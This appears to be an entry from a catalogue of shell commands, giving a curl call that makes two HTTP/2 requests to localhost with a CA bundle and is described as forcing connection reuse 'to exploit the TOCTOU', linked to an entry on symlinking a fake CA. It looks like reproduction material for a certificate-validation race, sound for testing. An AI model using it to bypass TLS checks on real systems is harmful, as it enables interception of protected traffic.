---
data: >-
  {CURL_BINARY_PATH} --http2 -v --cacert ca.crt
  https://localhost:8443/secure/data1 --cacert ca.crt
  https://localhost:8443/secure/data2
tags:
  - curl
  - http2
  - tls
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:19.026Z'
id: 5673cc9f-30ce-4e42-aaed-49ecb78a1b4d
verified: false
validated: true
submitted: true
---
# curl-http2-requests-with-cacert

## Command

```bash
./src/curl --http2 -v --cacert ca.crt https://localhost:8443/secure/data1 --cacert ca.crt https://localhost:8443/secure/data2
```

## Description

Makes two HTTPS requests over HTTP/2 to localhost, using the CA bundle for validation, forcing connection reuse to exploit the TOCTOU.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--http2` | Use HTTP/2 protocol | Yes |
| `-v` | Verbose output | Yes |
| `--cacert ca.crt` | CA bundle file | Yes |
| URL1 | First endpoint | Yes |
| URL2 | Second endpoint for reuse | Yes |

## Examples

### Basic Usage

```bash
./src/curl --http2 -v --cacert ca.crt https://localhost:8443/secure/data1 --cacert ca.crt https://localhost:8443/secure/data2
```

### Advanced Usage

```bash
./src/curl --http2 -v --cacert ca.crt --resolve localhost:8443:127.0.0.1 https://localhost:8443/secure/data1 https://localhost:8443/secure/data2
```

## Expected Output

Both requests succeed with 'Re-using existing connection!' and 'OK' responses; no SSL errors.

## Related

- [[commands/ln-symlink-fake-ca]]
